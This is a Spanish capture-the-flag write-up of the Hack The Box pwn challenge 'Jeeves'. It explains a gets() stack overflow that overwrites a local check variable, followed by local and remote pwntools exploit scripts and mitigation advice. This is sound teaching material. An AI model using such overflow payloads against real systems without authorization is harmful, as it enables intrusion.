---
challenge: Jeeves
type: Pwn
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [pwn, buffer-overflow, stack, dead-code, variable-overwrite, pwntools]
---

# Jeeves — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flag real.

## TL;DR

El binario usa `gets` sobre un buffer de 60 bytes y compara una variable local con `0x1337bab3`. La comparación nunca es verdadera, pero el desbordamiento permite sobrescribir la variable y alcanzar el código que lee y muestra la flag. No hace falta controlar la dirección de retorno.

## Enunciado y superficie

- Pwn, Easy, retirado.
- Se entrega un binario de 64 bits y una instancia remota.
- El objetivo es ejecutar la rama que imprime la flag.

```bash
file jeeves
checksec --file=jeeves
```

## Reconocimiento

- ELF 64 bits, no stripped.
- `gets` en `main` y una comparación contra `0x1337bab3`.
- La rama verdadera abre `flag.txt`, lee su contenido y lo imprime.

```bash
nm jeeves | grep -E ' main|gets|open|read'
objdump -d -M intel jeeves | sed -n '/<main>:/,/^$/p'
```

## Análisis del código

El binario declara un buffer de 60 bytes seguido de una variable local inicializada a `0xdeadc0d3`. `gets` no limita la entrada. La comparación posterior comprueba si la variable vale `0x1337bab3`; como el valor inicial es distinto, la rama es código muerto.

```c
char buf[60];
int check = 0xdeadc0d3;
gets(buf);
if (check == 0x1337bab3) { /* read flag */ }
```

## Explicación del fallo

Al escribir 60 bytes se llena el buffer; los siguientes 4 bytes sobrescriben `check`. La comprobación pasa y el programa ejecuta la rama que abre la flag. La PIE no importa porque no se reescribe una dirección, solo un valor en la pila.

## Reproducción local

```bash
# Crear un flag.txt local para probar.
printf 'HTB{<flag>}\n' > flag.txt
python3 - <<'PY'
from pwn import *
p = process('./jeeves')
p.sendline(b'A' * 60 + p64(0x1337bab3))
print(p.recvall().decode())
PY
```

## Explotación

```python
from pwn import remote, p64

io = remote("<IP>", <PORT>)
io.sendline(b"A" * 60 + p64(0x1337bab3))
print(io.recvall().decode())
```

La salida contiene la flag; se redacta. Si el binario espera un salto de línea, `sendline` lo añade.

## Evidencia

- Desensamblado de la comparación.
- Payload y respuesta del servidor.
- Flag redactada.

## Lecciones aprendidas

- No todo desbordamiento busca una shell: a veces basta con cambiar una variable.
- `gets` elimina cualquier control de longitud.
- El diseño de la pila y el orden de las variables determinan el offset.

## Mitigaciones y detección

- Sustituir `gets` por `fgets` y compilar con canary, PIE y NX.
- No confiar en variables locales para decisiones de seguridad.
- Validar la longitud de la entrada en el servidor.
- Alertar de crashes repetidos y de procesos que abren `flag.txt` tras una entrada larga.

## Referencias

- <https://www.hackthebox.com/challenges/Jeeves>
- <https://man7.org/linux/man-pages/man3/gets.3.html>
- <https://attack.mitre.org/techniques/T1190/>
- <https://github.com/Gallopsled/pwntools>
